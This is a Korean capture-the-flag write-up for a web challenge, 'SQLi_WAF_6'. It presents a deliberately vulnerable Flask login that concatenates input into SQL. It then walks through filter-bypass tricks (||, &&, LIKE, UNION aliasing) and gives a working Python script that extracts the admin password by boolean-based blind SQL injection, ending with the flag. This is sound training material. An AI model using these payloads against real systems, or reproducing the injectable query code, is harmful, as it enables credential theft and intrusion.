---
title: "[Writeup] Knockon Bootcamp - 3.6 SQLi_WAF_6"
categories:
  - Web Hacking
tags:
  - Writeup
  - Knockon Bootcamp
  - Blind SQL Injection
  - Boolean based
  - Filter Bypass
last_modified_at: 2024-08-29T17:30:00-05:00
published: true
---

|

## 문제

<http://war.knock-on.org:10035/>

![3.6 SQLi WAF 6 1](/assets/images/writeup/web-hacking/knock-on/3-6_SQLi_WAF_6_1.png)

![3.6 SQLi WAF 6 2](/assets/images/writeup/web-hacking/knock-on/1-1_SQL_Injection_2.png)

![3.6 SQLi WAF 6 3](/assets/images/writeup/web-hacking/knock-on/1-1_SQL_Injection_3.png)

|

|

|

### 목표

---

필터링 로직을 우회하여 admin 계정의 비밀번호 알아내기

|

### 공격 기법

---

Blind SQL Injection

- Boolean based

- Filter Bypass

|

|

|

## 문제 코드

```python
from flask import Flask, request, render_template, redirect, url_for
from flask_sqlalchemy import SQLAlchemy
from sqlalchemy import text
import os

app = Flask(__name__)

MYSQL_DATABASE = os.getenv('MYSQL_DATABASE')
MYSQL_USER = os.getenv('MYSQL_USER')
MYSQL_PASSWORD = os.getenv('MYSQL_PASSWORD')
MYSQL_HOST = 'db'

app.config['SQLALCHEMY_DATABASE_URI'] = f'mysql+pymysql://{MYSQL_USER}:{MYSQL_PASSWORD}@{MYSQL_HOST}/{MYSQL_DATABASE}'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password = db.Column(db.String(80), nullable=False)

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    error = None
    query = None
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']

        filtering_list = ['or', 'and', '=', '>', '<']
        username = request.form["username"].lower()
        password = request.form["password"].lower()

        for filter in filtering_list :
            if (filter in username) or (filter in password):
                return render_template("login.html", error='no Hack!')

        query = text(f"SELECT * FROM user WHERE username = '{username}' AND password = '{password}'")
        with db.engine.connect() as connection:
            result = connection.execute(query)
            user = result.fetchone()
        if user :
            return render_template('success.html')
        else:
            error = 'Invalid Credentials'
            
    return render_template('login.html', error=error, query=query)

if __name__ == '__main__':
    db.create_all()
    app.run(debug=True, host='0.0.0.0', port=10003)
```

|

|

|

## 코드 분석

### user 테이블

---

```sql
class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password = db.Column(db.String(80), nullable=False)
```

`user 테이블`의 컬럼 명은 id, username, password임

|

|

### login()

---

```sql
filtering_list = ['or', 'and', '=', '>', '<']
username = request.form["username"].lower()
password = request.form["password"].lower()
```

공백, 따옴표는 사용 가능하지만 등호는 사용할 수 없음

또한 `lower()`로 인해, 대문자를 사용한 `OR`과 `AND`의  우회가 불가능함

|

```sql
if user :
	return render_template('success.html')
```

로그인에 성공하면 `success.html`로 리다이렉트 되지만,  화면에서 알 수 있는 정보는 없음

Boolean based Blind SQL Injection으로 admin 계정의 비밀번호를 알아내야함

|

|

|

## Exploit

### 필터링 우회: OR과 AND

---

```sql
|| # or

&& # and
```

`OR`과 `AND`는 `||`과 `&&`로 간단하게 우회할 수 있음

|

|

### 필터링 우회: 등호

---

```sql
select * from user where username = 'admin'
```

이러한 쿼리가 있을 때 등호 필터링을 우회하는 방법은 크게 세 가지가 있다

1. 부등호
    
    ```sql
    select * from user where username <> 'admin' is false
    ```
    
    `<>`는 같지 않음을 의미함
    
     `username <> 'admin' is false`는 같지 않지 않다가 되어 등호와 같은 기능을 하게 됨
    
    이 문제에서는 부등호가 필터링 되어 있기 때문에 사용 불가
    
    |
    
2. LIKE
    
    ```sql
    select * from user where username LIKE 'admin'
    ```
    
    `LIKE`은 보통 패턴 매칭에 사용하지만 **admin**이라는 정확한 데이터를 설정하여 등호의 역할로도 쓸 수 있음
    
    |
    
3. IN
    
    ```sql
    select * from user where username IN ('admin')
    ```
    
    `IN`은 괄호 안에 있는 값들 중 하나에 해당하는 것을 가져올 때 사용하며, admin이라는 값 하나만 지정해 등호처럼 쓸 수 있음
    
    |
    

### 비밀번호 길이 알아내기

---

```sql
admin' and length(password) = 1 #
```

비밀번호를 알아내기 위한 기본 쿼리

|

```sql
admin' && length(password) like 1 #
```

`and`와 `=`를 우회하도록 수정된 쿼리

하지만 `password`의 `or`로 인해 막힘

|

```sql
admin' && length("passw"+char(111)+"rd") like 1 #
```

```sql
admin' && length(concat("passwo","rd")) like 8 #
```

`‘or’`을 우회하기 위해 위와 같이 시도하면 `‘password’`문자열 자체의 길이로 인식함

|

```sql
-- as 사용 예
select password as pw from user
```

 `password`열의 별칭을 `pw`로 지정

해결 방법은 `user 테이블`의 `password 열`의 이름 자체를 바꾸는 것임. 정확히는 별칭을 부여하는 것

하지만 위 예시처럼 `password`라는 열 이름 자체를 입력할 수는 없기 때문에 **union**을 활용해야 함

|

|

### 쿼리 작성

---

```sql
' union select 1,2,3 #
```

`union`을 사용해 새 쿼리를 작성하기 위한 준비.

|

```sql
' union select 1,2,3 from (테이블) #
```

union을 활용해 테이블을 재구성해야 함

|

**user 테이블**

| id | username | password |
| --- | --- | --- |
| 1 | guest | password |
| 2 | admin | k0{asd} |

```sql
-- 테이블 재구성 쿼리
select 1,2,3
union
select * from user
```

```sql
-- 쿼리 결과
1 | 2 | 3
1 | guest | password
2 | admin | k0{flag}
```

user 테이블이 위와 같을 때, 쿼리 실행 결과

`user 테이블`의 열이 `1,2,3`으로 바뀜

union의 최종 결과의 열 이름은 첫 번째 쿼리의 열 이름을 사용하기 때문임. `AS`를 이용해 컬럼 명을 바꾸어 사용하기 위해서는 쿼리 순서가 반드시 지켜져야 함

하지만 MySQL에서는 열 이름은 숫자로 시작할 수 없기 때문에 `where 2 = ‘admin’`같은 조건은 사용할 수 없음

|

```sql
-- 테이블 재구성 쿼리
select 1 as id, 2 as name, 3 as pw
union
select * from user
```

```sql
-- 쿼리 결과
id | name | pw
1 | guest | password
2 | admin | k0{flag}
```

`AS`를 사용해 별칭을 지정해주면 `where name = ‘admin'`같은 조건을 사용할 수 있게 됨

|

```sql
union
select 1,2,3 from (
	select 1,2 as name,3 as pw
	union
	select * from user)테이블_이름
```

 `union`을 사용해 테이블을 재구성하여, `user 테이블`의 열에 별칭을 지정

union을 사용해 테이블을 재구성 하였다면 해당 테이블에도 별칭을 붙여줘야 함

|

```sql
union
select 1,2,3 from (
	select 1,2 as name,3 as pw
	union
	select * from user)fxxk
where name like 'admin'
&& length(pw) like 1
```

마지막으로 `admin`의 비밀번호 길이를 알아내기 위한 조건 추가

|

|

### 비밀번호 알아내기

---

```sql
ASCII(SUBSTRING(pw, 비밀번호자릿수, 1)) like 아스키코드
```

```sql
union
select 1,2,3 from (
	select 1,2 as name,3 as pw
	union
	select * from user)fxxk
where name like 'admin'
&& ASCII(SUBSTRING(pw, 1, 1)) like 75
```

각 자리수에 맞는 비밀번호를 찾는 조건 추가

비밀번호 길이를 알아냈다면, 1부터 비밀번호 길이까지 아스키코드를 바꿔가며 비밀번호를 찾을 수 있음

역시 자동화가 필요함

|

|

### 자동화 코드: find_password_length()

---

기존 자동화 코드에서 payload 수정

```python
payload= {"username": f"{username}' union select 1,2,3 from (select 1,2 as name, 3 as pw union select * from user) fxxk where name like 'admin' && length(pw) like {length} -- 1", "password": f"{password}"}
```

|

|

### 자동화 코드: find_password()

---

마찬가지로 payload 수정

```python
payload = {"username":f"{username}' union select 1,2,3 from (select 1,2 as name, 3 as pw union select * from user) xxx where name like 'admin' && ASCII(SUBSTRING(pw, {length}, 1)) like {ascii_code} -- 1", "password":f"{password}"}
```

|

|

|

## Payload

```python
import requests

# 비밀번호 길이 찾기
def find_password_length(url, username, password):
	for length in range(0, 51): # 0부터 50까지
		payload= {"username": f"{username}' union select 1,2,3 from (select 1,2 as name, 3 as pw union select * from user) xxx where name like 'admin' && length(pw) like {length} -- 1", "password": f"{password}"}
		res = requests.post(url, data=payload)
		if "Hello" in res.text:
			return length

# 비밀번호 찾기
def find_password(url, password_length, username, password):
    string = ""
    for length in range(1, password_length+1): # 비밀번호 위치 (1부터 password_length까지)
        print(f"{length}번째 문자 탐색 중...")
        for ascii_code in range(32, 127): # 아스키 코드 32부터 126까지
            payload = {"username":f"{username}' union select 1,2,3 from (select 1,2 as name, 3 as pw union select * from user) xxx where name like 'admin' && ASCII(SUBSTRING(pw, {length}, 1)) like {ascii_code} -- 1", "password":f"{password}"}
            res = requests.post(url, data=payload)
            if "Hello" in res.text:
                string+= chr(ascii_code) # ascii 값을 문자로 변환
                print(f"현재까지 알아낸 비밀번호: {string}")
                # return string 여기서 반환하면 안됨
                break
    return string # 완성된 string 반환

url = "http://war.knock-on.org:10035/login"
username = ""
password = "1"

password_length = find_password_length(url, username, password)
print(f"비밀번호 길이: {password_length}")

password_string = find_password(url, password_length, username, password)
print(f"완성된 비밀번호: {password_string}")
```

|

|

### FLAG

---

```
K0{blind_sql_with_WAF}
```

|

---